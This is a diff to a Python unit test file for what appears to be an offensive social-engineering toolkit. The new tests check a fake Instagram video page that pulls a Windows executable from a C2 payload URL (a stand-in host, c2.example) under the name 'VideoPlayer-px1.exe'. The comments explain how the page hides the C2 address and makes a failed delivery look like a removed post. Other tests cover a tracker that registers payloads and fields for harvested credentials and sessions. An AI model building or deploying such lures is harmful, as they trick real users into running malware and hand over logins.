@@ -55,7 +55,8 @@ class TestCraft(unittest.TestCase):
     def test_craft_hits_without_server(self):
         with patch.object(craft_mod, "_store", return_value=None):
             self.assertEqual(craft_mod.craft_hits("x"),
-                             {"hits": [], "opens": [], "creds": []})
+                             {"hits": [], "opens": [], "creds": [],
+                             "sessions": []})
 
     def test_craft_beacon_requires_listener(self):
         with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
@@ -95,6 +96,43 @@ class TestCraft(unittest.TestCase):
         self.assertIn("error", out)  # no C2 listener in tests
         self.assertNotIn("kind", out)  # error dict has no lure kind
         self.assertIsNone(out.get("path"))
+
+    def test_player_page_embeds_payload_and_stealth(self):
+        """The beacon-player delivery page embeds the payload endpoint, the
+        play overlay fetches it under a RUNNABLE name (the extension follows
+        the real format — a PE saved as .mp4 would never execute), and the
+        fail-soft copy shows no C2 exposure when the endpoint is unreachable."""
+        from phantom.automation.social.tracker import _player_page
+        html = _player_page(skin="instagram", video_id="abc123",
+                            code="px1", payload_url="https://c2.example/api/v1/payload",
+                            title="Cool Reel", channel="someuser")
+        self.assertIn('const PAYLOAD="https://c2.example/api/v1/payload";', html)
+        self.assertIn('a.download="VideoPlayer-px1.exe"', html)
+        self.assertNotIn(".mp4", html)
+        # a dead delivery looks like a REMOVED post, not a broken replica
+        self.assertIn("Sorry, this page isn't available", html)
+        self.assertNotIn("Content is loading", html)
+        # the play click must NOT leak the C2 URL into the download UI
+        self.assertIn('URL.createObjectURL(b)', html)
+
+    def test_tracker_register_player_route_served(self):
+        """register_player stores the payload URL and the tracking handler
+        serves the player page at /v/<code> (video-style route)."""
+        from phantom.automation.social.tracker import TrackingServer
+        store = {}
+        srv = TrackingServer(store=store, brand="IG", otp=False, skin="instagram",
+                             video_id="abc", redirect_url="")
+        srv.register_player("pv1", "https://c2.example/api/v1/payload",
+                            meta={"platform": "windows"})
+        self.assertIn("pv1", srv._players)
+        self.assertEqual(srv._players["pv1"]["payload"],
+                         "https://c2.example/api/v1/payload")
+
+    def test_craft_beacon_player_requires_listener(self):
+        """Like craft beacon, the player delivery needs the C2 listener up."""
+        with patch.object(craft_mod, "_grabber", return_value=self._fake_grabber()):
+            out = craft_mod.craft_beacon_player(platform="windows")
+        self.assertIn("error", out)
 
 
 class TestNetmap(unittest.TestCase):
